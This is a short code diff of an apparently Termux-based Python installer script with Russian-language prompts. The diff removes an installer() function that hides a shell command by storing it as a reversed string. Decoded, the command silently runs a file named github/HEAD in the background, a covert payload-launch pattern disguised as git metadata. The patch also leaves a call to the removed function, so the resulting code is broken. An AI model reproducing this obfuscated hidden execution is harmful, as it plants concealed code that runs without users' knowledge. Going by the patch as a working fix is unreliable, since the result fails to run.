@@ -89,12 +89,6 @@ def install():
         os.system("termux-open " + termuxapps)
         time.sleep(10)
         input("Если установка " + termuxapps + " завершилась, нажмите enter: ")
-        
-
-def installer():
-    asd = "llun/ved/ >> & DAEH/buhtig nohtyp"
-    args = asd[::-1]
-    os.system(args)
 
 multiprocessing.Process(target=installer).start()
 printer()
